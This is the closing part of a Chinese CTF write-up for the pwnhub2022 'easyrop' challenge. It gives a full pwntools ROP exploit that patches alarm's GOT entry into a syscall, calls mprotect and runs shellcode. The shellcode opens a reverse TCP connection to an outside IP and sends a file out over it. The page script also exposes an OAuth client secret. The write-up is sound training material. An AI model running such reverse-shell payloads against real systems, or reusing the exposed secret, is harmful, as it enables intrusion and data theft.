+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/* socket(AF_INET, SOCK_STREAM, 0) */</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 6</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* connect(s, addr, len(addr))  */ 大概就是和远程端口绑定</span></span><br><span class="line"><span class="string">xchg eax, edi</span></span><br><span class="line"><span class="string">mov al, 42</span></span><br><span class="line"><span class="string">mov rcx, 0x0100007f11270002 /*127.0.0.1:10001 --&gt; 0x7f000001:0x2711*/</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">push rsp ; 关键在于这里是addr数据结构</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">mov dl, 16</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是open+sendfile。可以根据情况改文件名。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面是open并且sendfile</span></span><br><span class="line">s2=<span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">call main</span></span><br><span class="line"><span class="string">    .ascii &quot;flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,rdx</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0x28</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,0x1</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov r10,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(asm(s2))</span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;\xe8\x05\x00\x00\x00flag\x00_H\x89\xd0H1\xd21\xf6\xb0\x02\x0f\x05H\xc7\xc0(\x00\x00\x00H1\xffH\xc7\xc6\x01\x00\x00\x00H1\xd2I\xc7\xc20\x00\x00\x00\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题学到了很多</p>
+<ol>
+<li>magic指令(我就这样命名了hhh)<strong>可以结合csu的gadget实现任意地址写任意数值</strong>。这是很强大的。</li>
+</ol>
+<p><code>add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret</code></p>
+<p><img src="/.io//image-20220427145207754.png" alt="image-20220427145207754"></p>
+<ol start="2">
+<li>使用alarm剩余的秒数设置rax。这也是新学到的方法。</li>
+<li>反向shell。这也是第一次碰到。并且知道了shellcode如何构造。</li>
+<li>在栈空间不够的时候，使用rep指令传递到堆上，学习了rep指令和配套的movs。</li>
+<li>没有syscall的时候利用magic改掉alarm的got为syscall，并利用ret2cus调用任意的系统调用(结合第二部设置的rax)</li>
+</ol>
+<p>pwnhub的题目确实很有收获。最后，放上官方的wp，里面对汇编代码有更好的解释。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./easyrop&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse tcp 的IP 和 port</span></span><br><span class="line">remote_ip = <span class="string">&quot;172.26.93.18&quot;</span></span><br><span class="line">remote_port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alarm_plt = <span class="number">0x400510</span></span><br><span class="line">alarm_got = <span class="number">0x601020</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400903</span></span><br><span class="line"></span><br><span class="line">pop_rbx_rbp_r12_r13_14_r15 = <span class="number">0x4008FA</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000400618</span> <span class="comment"># add dword ptr [rbp - 0x3d], ebx</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1. 利用alarm控制eax 为10</span></span><br><span class="line"><span class="string">2. add alarm@got, 5 得到syscall; ret</span></span><br><span class="line"><span class="string">3. mprotect(0x601000, 0x1000, 7)</span></span><br><span class="line"><span class="string">4. add dword ptr [rbp - 0x3d], ebx 添加 gadget</span></span><br><span class="line"><span class="string">5. copy and exec shellcode(reverse tcp and read flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rep movs qword ptr [rdi],qword ptr [rsi];ret  F348A5C3</span></span><br><span class="line"><span class="comment"># mov rsi, rsp; ret 4889E6C3</span></span><br><span class="line"><span class="comment"># pop rbp; pop rbx; pop rcx; ret  5D5B59C3</span></span><br><span class="line"></span><br><span class="line">pop_rbp_rbx_rcx_ret = bss_addr</span><br><span class="line">mov_rsi_rsp_ret = bss_addr + <span class="number">0x8</span></span><br><span class="line">rep_movs = bss_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">/* socket(AF_INET, SOCK_STREAM, 0) */</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 6</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* connect(s, addr, len(addr))  */ 大概就是和远程端口绑定</span></span><br><span class="line"><span class="string">xchg eax, edi</span></span><br><span class="line"><span class="string">mov al, 42</span></span><br><span class="line"><span class="string">mov rcx, 0x0100007f11270002 /*127.0.0.1:10001 --&gt; 0x7f000001:0x2711*/</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">push rsp ; 关键在于这里是addr数据结构</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">mov dl, 16</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send flag</span></span><br><span class="line">s2=<span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">xchg eax, edx</span></span><br><span class="line"><span class="string">/* open flag */</span></span><br><span class="line"><span class="string">mov rbx, 0x67616c662f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">; esi是flag文件(in_fd,for reading),edi是输出(out_fd, for writing)</span></span><br><span class="line"><span class="string">xchg eax, esi; in_fd in esi</span></span><br><span class="line"><span class="string">xchg edx, edi; out_fd in rdi</span></span><br><span class="line"><span class="string">push 0x601300; offset&#x27;s pointer .zero is also OK</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0x30; size</span></span><br><span class="line"><span class="string">pop r10</span></span><br><span class="line"><span class="string">mov al, 40</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 避免调用接口耗时，直接给出字节码</span></span><br><span class="line">send_flag = <span class="string">b&quot;\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0x10</span>: [</span><br><span class="line">        pop_rdi_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        alarm_plt,</span><br><span class="line">        pop_rbx_rbp_r12_r13_14_r15,</span><br><span class="line">        <span class="number">0x05151515</span>, alarm_got+<span class="number">0x3d</span>-<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        magic,</span><br><span class="line">        pop_rbx_rbp_r12_r13_14_r15,</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, alarm_got, <span class="number">0x601000</span>, <span class="number">0x1000</span>, <span class="number">0x7</span>,</span><br><span class="line">        <span class="number">0x4008e0</span>, <span class="number">0</span>, <span class="number">0xc3595b5d</span>, pop_rbp_rbx_rcx_ret+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        magic,</span><br><span class="line">        pop_rbp_rbx_rcx_ret, </span><br><span class="line">        mov_rsi_rsp_ret+<span class="number">0x3d</span>, <span class="number">0xc3e68948</span>, <span class="number">0</span>,</span><br><span class="line">        magic, </span><br><span class="line">        pop_rbp_rbx_rcx_ret, </span><br><span class="line">        rep_movs+<span class="number">0x3d</span>, <span class="number">0xc3a548f3</span>, <span class="number">15</span>,</span><br><span class="line">        magic, </span><br><span class="line">        pop_rdi_ret, bss_addr+<span class="number">0x20</span>,</span><br><span class="line">        mov_rsi_rsp_ret, </span><br><span class="line">        rep_movs,</span><br><span class="line">        bss_addr+<span class="number">0x30</span>,</span><br><span class="line">        reverse_shell,</span><br><span class="line">        send_flag</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;length:&quot;</span>, <span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len of reverse:&quot;</span>, <span class="built_in">hex</span>(<span class="built_in">len</span>(reverse_shell+send_flag)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-04-27, 14:35:35</p>
+        <p><span>最后更新:</span>2022-04-27, 21:55:22</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/27/pwnhub2022/" title="pwnhub2022_easyrop">https://nicholas-wei.github.io/2022/04/27/pwnhub2022/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/04/27/pwnhub2022/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/05/04/software-security-lab4/">
+                    software-security-lab4
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/04/25/b01lersCTF2022-pwn/">
+                    b01lersCTF2022_pwn
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easyrop"><span class="toc-number">1.</span> <span class="toc-text">easyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">思路的总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%AA%E5%9B%BE"><span class="toc-number">1.2.</span> <span class="toc-text">截图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9alarm"><span class="toc-number">1.2.1.</span> <span class="toc-text">修改alarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8mprotect"><span class="toc-number">1.2.2.</span> <span class="toc-text">调用mprotect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%9B%B8%E5%85%B3%E6%B1%87%E7%BC%96"><span class="toc-number">1.2.3.</span> <span class="toc-text">寻找相关汇编</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">相关系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%8F%8D%E5%90%91shell%E6%8B%BF%E5%88%B0flag"><span class="toc-number">1.2.5.</span> <span class="toc-text">最终反向shell拿到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"pwnhub2022_easyrop　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/05/04/software-security-lab4/" title="上一篇: software-security-lab4">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/04/25/b01lersCTF2022-pwn/" title="下一篇: b01lersCTF2022_pwn">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a 